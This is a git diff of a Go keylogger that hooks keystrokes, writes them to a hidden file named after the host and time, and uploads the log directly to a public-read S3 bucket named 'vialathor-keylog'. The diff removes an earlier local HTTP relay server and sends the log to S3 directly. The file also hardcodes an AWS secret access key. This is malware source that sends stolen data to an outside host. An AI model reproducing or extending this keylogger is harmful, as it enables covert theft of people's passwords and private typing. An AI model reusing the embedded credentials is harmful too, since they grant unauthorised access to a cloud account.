@@ -5,10 +5,6 @@ import (
 	"os"
 	"github.com/robotn/gohook"
 	"time"
-	"net/http"
-	"bytes"
-	"io"
-	"mime/multipart"
 
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/session"
@@ -30,15 +26,8 @@ func main() {
     os.Setenv("AWS_SECRET_ACCESS_KEY", "uc+OGp6TH3900UYriihV8GKmeJTrzA4hI5Iqb4Aq")
     os.Setenv("AWS_REGION", "ap-southeast-2")
 
-	go initServer()
-
 	keylog()
 }
-
-// func fileExists(path string) bool {
-//     _, err := os.Stat(path)
-//     return !os.IsNotExist(err)
-// }
 
 func keylog() {
 
@@ -55,8 +44,10 @@ func keylog() {
 	}
 
 	// need to test if the name actually changes.
-	fileName := fmt.Sprintf(".%s - %s.txt", hostName, runTime.Format(time.ANSIC))
-	fmt.Println(fileName)
+	fileName := fmt.Sprintf(".%s - %s %s.txt",
+	hostName,
+	runTime.Format("Jan 02 2006"),
+	runTime.Format(time.Kitchen))
 
 	file, err := os.Create(fileName)
 	if err != nil {
@@ -118,103 +109,17 @@ func uploadFile(fileName string) error {
 	if err != nil {
 		panic(err)
 	}
-
 	defer file.Close()
 
-	var buf bytes.Buffer
-	writer := multipart.NewWriter(&buf)
-
-	temp, err := writer.CreateFormFile("file", fileName)
-	if err != nil {
-		return err
-	}
-
-	// Copy file data to temp
-	_, err = io.Copy(temp, file)
-	if err != nil {
-		return err
-	}
-	writer.Close()
-
-	// HTTP POST request to localhost with the file
-	req, err := http.NewRequest("POST", "http://localhost:8080/upload", &buf)
-	if err != nil {
-		return err
-	}
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-
-	// Send the request to server and await response
-	resp, err := http.DefaultClient.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()	
-
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("upload failed: %s", resp.Status)
-	}
-
-	return nil
-}
-
-
-func initServer() {
-
-	portListener, err := net.Listen("tcp", ":0")
-	if err != nil {
-		panic(err)
-	}
-
-	// I don't think i need this line?
-	http.HandleFunc("/upload", uploadHandler)
-	panic(http.ListenAndServe(portListener, nil))
-}
-
-func uploadHandler(w http.ResponseWriter, r *http.Request) {
-
-	// Limit size of file
-	r.ParseMultipartForm(10 << 20)
-
-	file, dataHandler, err := r.FormFile("file")
-	if err != nil {
-		panic(err)
-	}
-	defer file.Close()
-
-	// Create a temp file 
-	fileMetaData := dataHandler.Filename
-	newFile, err := os.Create(fileMetaData)
-	if err != nil {
-		panic(err)
-	}
-	defer newFile.Close()
-
-	// Make a copy of the newFile so S3 can access the path and file to open to upload.
-	io.Copy(newFile, file)
-
-	// Pass through the file path
-	err = uploadToS3(fileMetaData, dataHandler.Filename)
-	if err != nil {
-		panic(err)
-	}
-}
-
-func uploadToS3(localPath, s3Key string) error {
 	sess := session.Must(session.NewSession(&aws.Config{
 		Region: aws.String("ap-southeast-2"),
 	}))
-
-	file, err := os.Open(localPath)
-	if err != nil {
-		panic(err)
-	}
-	defer file.Close()
 
 	s3client := s3.New(sess)
 
 	_, err = s3client.PutObject(&s3.PutObjectInput{
 		Bucket: aws.String("vialathor-keylog"),
-		Key:    aws.String(s3Key),
+		Key:    aws.String(fileName),
 		Body:   file,
 		ACL:    aws.String("public-read"),
 	})
